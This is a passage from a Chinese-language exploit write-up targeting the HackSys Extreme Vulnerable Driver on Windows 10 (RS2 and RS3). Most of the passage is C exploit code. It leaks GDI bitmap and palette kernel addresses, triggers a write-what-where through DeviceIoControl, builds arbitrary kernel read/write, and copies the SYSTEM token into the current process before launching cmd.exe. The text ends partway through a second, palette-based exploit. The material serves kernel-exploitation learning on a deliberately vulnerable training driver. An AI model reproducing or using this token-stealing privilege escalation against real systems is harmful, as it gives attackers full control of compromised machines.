            return;
        }
        /*
        *[+]Step2:Define window
        */
        WNDCLASSEX wnd = { 0x0 };
        wnd.cbSize = sizeof(wnd);
        wnd.lpszClassName = TEXT("MainWClass");
        wnd.lpszMenuName = TEXT("AAAAA");
        wnd.lpfnWndProc = DefWindowProc;
        int result = RegisterClassEx(&wnd);
        if (!result)
        {
            printf("RegisterClassEx error: %d\r\n", GetLastError());
        }
        /*
        *[+]Step3:Create window
        */
        HWND test = CreateWindowEx(
            0,
            wnd.lpszClassName,
            TEXT("WORDS"),
            0,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            CW_USEDEFAULT,
            NULL, NULL, NULL, NULL);
        /*
        *[+]Step4:Compute address of Bitmap
        */
        managerBmp = leak();
        workerBmp = leak();
        printf("[+]ManagerBmp address leak pvScan0 at: 0x%p\n", managerBmp.pvScan0);
        printf("[+]WorkerBmp address leak pvScan0 at: 0x%p\n", workerBmp.pvScan0);
        /*
        *[+]Step5:You know it => Write What Where
        */
        PPayload payload = NULL;
        payload = (PPayload)HeapAlloc(GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            sizeof(Payload));
        payload->what = (PULONG_PTR)&workerBmp.pvScan0;
        payload->where = (PULONG_PTR)managerBmp.pvScan0;
        DWORD BytesReturned = 0;
        DeviceIoControl(hDevice, 0x0022200B, (LPVOID)payload, sizeof(Payload), NULL, 0, &BytesReturned, NULL);
    }
    VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
    {
        SetBitmapBits(managerBmp.hBmp, len, &whereRead);
        GetBitmapBits(workerBmp.hBmp, len, whatValue);    // read
    }
    VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
    {
        SetBitmapBits(managerBmp.hBmp, len, &whereWrite);
        SetBitmapBits(workerBmp.hBmp, len, &whatValue);    // write
    }
    DWORD64 stealToken()
    {
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
        if (NtQuerySystemInformation == NULL)
        {
            printf("[+]Failed to get NtQuerySystemInformation\n");
            return NULL;
        }
        DWORD len;
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
        PSYSTEM_MODULE_INFORMATION moduleInfo = NULL;
        moduleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!moduleInfo)
        {
            printf("[+]Failed to get moduleInfo\n");
            return NULL;
        }
        NtQuerySystemInformation(SystemModuleInformation, moduleInfo, len, &len);
        LPVOID kernelBase = moduleInfo->Module[0].ImageBase;
        LPVOID kernelImage = moduleInfo->Module[0].FullPathName;
        printf("[+]kernel base address is at: 0x%p\n", kernelBase);
        LPCSTR lpkernelName = (LPCSTR)(moduleInfo->Module[0].FullPathName + moduleInfo->Module[0].OffsetToFileName);
        printf("[+]kernel name is: %s\n", lpkernelName);
        HMODULE hUserSpacekernel = LoadLibraryExA(lpkernelName, 0, 0);
        if (hUserSpacekernel == NULL)
        {
            VirtualFree(moduleInfo, 0, MEM_RELEASE);
            return NULL;
        }
        FARPROC pUserKernelSymbol = GetProcAddress(hUserSpacekernel, "PsInitialSystemProcess");
        if (pUserKernelSymbol == NULL)
        {
            VirtualFree(moduleInfo, 0, MEM_RELEASE);
            return NULL;
        }
        FARPROC pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpacekernel + (PUCHAR)kernelBase);
        FreeLibrary(hUserSpacekernel);
        VirtualFree(moduleInfo, 0, MEM_RELEASE);
        LPVOID lpSystemEPROCESS = NULL;
        LPVOID lpSysProcID = NULL;
        LPVOID lpSystemToken = NULL;
        LIST_ENTRY lpNextEntryAddreess;
        readOOB((DWORD64)pLiveFunctionAddress, &lpSystemEPROCESS, sizeof(LPVOID));
        readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2e8), &lpSysProcID, sizeof(LPVOID));
        readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x358), &lpSystemToken, sizeof(LPVOID));
        readOOB((DWORD64)((PUCHAR)lpSystemEPROCESS + 0x2f0), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        printf("[+]system process address is: 0x%p\n", lpSystemEPROCESS);
        printf("[+]Next Process AT: 0x%p\n", lpNextEntryAddreess.Flink);
        printf("[+]system process token value is: 0x%p\n", lpSystemToken);
        printf("[+]system process PID is: 0x%p\n", lpSysProcID);
        DWORD64 currentProcessID = GetCurrentProcessId();
        LPVOID lpNextEPROCESS = NULL;
        LPVOID lpCurrentPID = NULL;
        LPVOID lpCurrentToken = NULL;
        DWORD dwCurrentPID;
        do
        {
            lpNextEPROCESS = (PUCHAR)lpNextEntryAddreess.Flink - 0x2e8;
            readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e0), &lpCurrentPID, sizeof(LPVOID));
            dwCurrentPID = LOWORD(lpCurrentPID);
            readOOB((DWORD64)((PUCHAR)lpNextEPROCESS + 0x2e8), &lpNextEntryAddreess, sizeof(LIST_ENTRY));
        } while (dwCurrentPID != currentProcessID);
        DWORD64 currentTokenAddress = (DWORD64)lpNextEPROCESS + 0x358;
        printf("[+]Start to write token");
        writeOOB(currentTokenAddress, lpSystemToken, sizeof(LPVOID));
        printf(" => done!\n");
    }
    int main() {
        init();
        Leak_Trigger();
        stealToken();
        CreateCmd();
        system("pause");
        return 0;
    }
可以看到最后我们是成功提权了的.
最后总结一下利用过程:  
1.通过WNDCLASSEX.lpszMenuName找到将要创建的bitmap对象的pvScan0地址(level up)  
2.创建bitmap对象并对应到pvScan0的地址.(level up)  
3.用漏洞改掉bitmap对象中pvScan0的值  
4.替换Token
## 0x06:RS3(WIN10_X64_1709)下的WWW
嗯,不出所料的,RS2下的利用手段在RS3下被kill掉了.然后k0shl师傅提出了一种新的[利用手段](https://blogs.360.cn/post/save-and-reborn-gdi-data-only-attack-from-win32k-typeisolation-2.html).说实话,看不懂…  
然后这里我要讲的是另外一种绕过技术,也是比较通用的技术—使用paltte进行读写.  
话不多说,上图
其实这个和bitmap类似,其中第一个红框框代表的是第二个红框框指向的内容的大小,第二个红框框指向的内容可以进行读写.  
这里进行读写使用的是SetPaletteEntries函数和GetPaletteEntries函数.  
其他的和RS2下的WWW漏洞利用一样,改一下偏移等数据就好.  
然后这里我copy的k0shl师傅的代码,发现行不通,像这样
但是k0shl师傅的exe是可以成功提权的.  
后来经过分析发现,是没有申请到对应的 lpszMenuName 所导致的.我直接这么说可能难以理解.上图
如图,如果不成功的话,!pool出来的是 Ustx,而且是free状态.然后成功了的话是这样的
!pool出来的是 Gh08,而且是Allocated状态.(那个*打不出来)  
然后提一下我是怎么定位到关键数据的.  
最开始我是根据输出定位到Worker_Palette的,然后意识到可能是palette出了问题,然后网上查找palette相关的内容,然后我找到了晏子霜师傅的CVE-2018-8453分析,用其中palette相关的内容leak成功.然后打算加入到我的代码中来,结果发现程序一调用CreatePalette函数就崩溃,也不知道为什么会崩溃,最后我尝试用k0shl师傅的代码改size大小,成功了.当然直接在k0shl师傅的exploit里改size大小是会崩溃的.  
代码贴贴:
    #include
    #include
    #define HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0X802, METHOD_NEITHER, FILE_ANY_ACCESS)
    typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
    typedef struct _WRITE_WHAT_WHERE {
        PULONG_PTR What;
        PULONG_PTR Where;
    } WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;
    PVOID IsMenu_Address = NULL, HMValidateHandle_Address = NULL;
    typedef HWND(__fastcall* My_HMValidateHandle)(
        HWND        Window,
        ULONG        Number
        );
    My_HMValidateHandle HMValidateHandle = NULL;
    LOGPALETTE* Palette = NULL;
    typedef enum _SYSTEM_INFORMATION_CLASS {
        SystemBasicInformation = 0,
        SystemPerformanceInformation = 2,
        SystemTimeOfDayInformation = 3,
        SystemProcessInformation = 5,
        SystemProcessorPerformanceInformation = 8,
        SystemModuleInformation = 11,
        SystemInterruptInformation = 23,
        SystemExceptionInformation = 33,
        SystemRegistryQuotaInformation = 37,
        SystemLookasideInformation = 45
    } SYSTEM_INFORMATION_CLASS;
    typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );
    typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    } SYSTEM_MODULE_INFORMATION_ENTRY, * PSYSTEM_MODULE_INFORMATION_ENTRY;
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG NumberOfModules;
        SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
    } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;
    typedef struct _HEAD
    {
        HANDLE h;
        DWORD  cLockObj;
    } HEAD, * PHEAD;
    typedef struct _THROBJHEAD
    {
        HEAD h;
        PVOID pti;
    } THROBJHEAD, * PTHROBJHEAD;
    typedef struct _G_PALETTE
    {
        HPALETTE _hpalette;
        DWORD64 _kobj_palette;
        DWORD flag;
    } GPALETTE, * PGPALETTE;
    typedef struct _THRDESKHEAD
    {
        THROBJHEAD h;
        PVOID    rpdesk;
        PVOID       pSelf;   // points to the kernel mode address
    } THRDESKHEAD, * PTHRDESKHEAD;
    PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
    HANDLE hDevice = NULL;
    lHMValidateHandle pHmValidateHandle = NULL;
    PGPALETTE Worker_Palette;
    PGPALETTE Manager_Palette;
    DWORD BytesReturned = 0;
    static VOID CreateCmd()
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
        WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
        BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
        if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
    }
    BOOL init()
    {
        printf("[+]Start to get HANDLE");
        // Get HANDLE
        hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
            GENERIC_READ | GENERIC_WRITE,
            NULL,
            NULL,
            OPEN_EXISTING,
            NULL,
            NULL);
        if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
        {
            return FALSE;
        }
        printf("Create HEVD Device Success,Handle at: 0x%p\n", hDevice);
        return TRUE;
    }
    BOOL FindHMValidateHandle() {
        HMODULE hUser32 = LoadLibraryA("user32.dll");
        if (hUser32 == NULL) {
            printf("Failed to load user32");
            return FALSE;
        }
        BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
        if (pIsMenu == NULL) {
            printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
            return FALSE;
        }
        unsigned int uiHMValidateHandleOffset = 0;
        for (unsigned int i = 0; i < 0x1000; i++) {
            BYTE* test = pIsMenu + i;
            if (*test == 0xE8) {
                uiHMValidateHandleOffset = i + 1;
                break;
            }
        }
        if (uiHMValidateHandleOffset == 0) {
            printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
            return FALSE;
        }
        unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
        unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
        //The +11 is to skip the padding bytes as on Windows 10 these aren't nops
        pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
        printf("[+]HMValidateHandle address is : 0x%p\n", pHmValidateHandle);
        return TRUE;
    }
    HPALETTE createPaletteofSize(int size) {
        // we alloc a palette which will have the specific size on the paged session pool. 
        if (size <= 0x90) {
            printf("Bad size! can't allocate palette of size < 0x90!");